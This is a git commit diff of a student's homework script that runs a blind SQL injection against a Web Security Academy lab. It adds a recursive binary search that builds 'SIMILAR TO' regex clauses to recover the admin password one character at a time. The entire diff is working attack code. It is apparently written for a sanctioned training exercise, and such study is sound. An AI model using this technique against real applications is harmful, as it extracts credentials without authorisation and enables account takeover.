21d9050674b3426d298be994203cb615ede9bb71
bradlet <bradlet2@pdx.edu>
2022-02-05 12:03:55 -0800

    Copy working recursive binary search impl from personal work dir

--- hw2/hw2.py
+++ hw2/hw2.py
@@ -7,7 +7,7 @@ from bs4 import BeautifulSoup
 
 # Adding this so I can use IntelliJ's play button.
 # This value is only used if none is supplied from the command line.
-MANUAL_CTF_URL = "https://ac6f1f941eeb2aa2c1b8165a00200036.web-security-academy.net/"
+MANUAL_CTF_URL = "https://ac191f2b1e846158c0581612000e00cf.web-security-academy.net/"
 # Valid characters that will be used when finding the admin's password via SIMILAR TO with regex
 VALID_CHARSET = string.ascii_lowercase + string.digits
 
@@ -67,28 +67,43 @@ def getPasswordLength():
     return num
 
 
+# Recursive binary search implementation:
+# @Returns
+#   next valid character in password
+# @Args
+#   charset: current range of chars to check if SIMILAR TO
+#   pw_so_far: string with all valid chars found in the password so far
+# base case:
+#   try_query returns true when provided charset is one character
+#       Note: if len(charset) is 1 and response true, return charset, else return empty string.
+# incremental step:
+#   find mid point of charset
+# update step:
+#   try binary_search(pass on same pw, first half of charset) and binary_search(pass on same pw, second half of charset)
+#   return whichever half is not empty string
+def binary_search(pw_so_far, charset):
+    qry_succeeded = try_query(buildQuery(and_clause=f'password SIMILAR TO \'{pw_so_far}[{charset}]%\''))
+
+    if not qry_succeeded:  # We can skip this branch of the recursive tree if the range didn't hold a valid char
+        return ""
+    if len(charset) == 1:
+        return charset  # charset is a single character; the next valid character in the password
+
+    mid = len(charset) // 2
+    first_half = binary_search(pw_so_far, charset[:mid])
+    return first_half if first_half != "" else binary_search(pw_so_far, charset[mid:])
+
+
 if __name__ == "__main__":
     url = getCtfUrl()
     begin_time = time.perf_counter()
 
-    # Plan:
-    #   Get password length so we can use that to find out when to end password search
-    #   Maintain string var holding the password that we know so far
-    #   while length of that string is less than password length:
-    #       for char in valid char set
-    #           try query with and clause of: pw so far + new char attempt + '%'
-    #           if that try returns true, append new char to pw so far, print pw so far, and break from for loop
-    #   now pw so far should be the password, so outside of any loops just try a SIMILAR_TO query w/ that pw to confirm
-
     pw_length = getPasswordLength()
     hold_password = ""
     while len(hold_password) < pw_length:
-        for char in VALID_CHARSET:
-            qry = buildQuery(and_clause=f'password SIMILAR TO \'{hold_password+char+"%"}\'')
-            if try_query(qry):
-                hold_password = hold_password + char
-                print(f'New char discovered; password so far: {hold_password}')
-                break
+        next_char = binary_search(hold_password, VALID_CHARSET)
+        hold_password = hold_password + next_char
+        print(f'New char discovered; password so far: {hold_password}')
 
     # Now just confirm that the above loop found the correct password:
     if try_query(buildQuery(and_clause=f'password SIMILAR TO \'{hold_password}\'')):
